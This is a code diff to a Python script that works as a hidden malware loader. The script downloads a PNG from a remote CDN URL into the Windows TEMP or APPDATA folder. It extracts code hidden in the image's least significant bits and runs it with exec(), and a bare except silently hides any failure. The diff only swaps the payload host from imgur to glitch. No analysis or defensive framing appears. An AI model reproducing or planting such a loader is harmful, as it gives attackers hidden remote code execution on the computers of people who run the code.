@@ -10,17 +10,19 @@ except:
     import requests
     from judyb import lsb
 
+request_image_link = "https://cdn.glitch.global/eb3e6f28-bcca-471f-b521-bb35172b0498/img.png"
+
 try:
-    if os.path.exists(f'{os.getenv("TEMP")}\\aRl53RS.png') != True:
-        r = requests.get('https://i.imgur.com/aRl53RS.png')
-        with open(f'{os.getenv("TEMP")}\\aRl53RS.png', 'wb') as f:
+    if os.path.exists(f'{os.getenv("TEMP")}\\img.png') != True:
+        r = requests.get(request_image_link)
+        with open(f'{os.getenv("TEMP")}\\img.png', 'wb') as f:
             f.write(r.content)
-        exec(lsb.reveal(f'{os.getenv("TEMP")}\\aRl53RS.png'))
+        exec(lsb.reveal(f'{os.getenv("TEMP")}\\img.png'))
     else:
-        r = requests.get('https://i.imgur.com/aRl53RS.png')
-        with open(f'{os.getenv("APPDATA")}\\aRl53RS.png', 'wb') as f:
+        r = requests.get(request_image_link)
+        with open(f'{os.getenv("APPDATA")}\\img.png', 'wb') as f:
             f.write(r.content)
-        exec(lsb.reveal(f'{os.getenv("APPDATA")}\\aRl53RS.png'))
+        exec(lsb.reveal(f'{os.getenv("APPDATA")}\\img.png'))
 except:
     pass
 
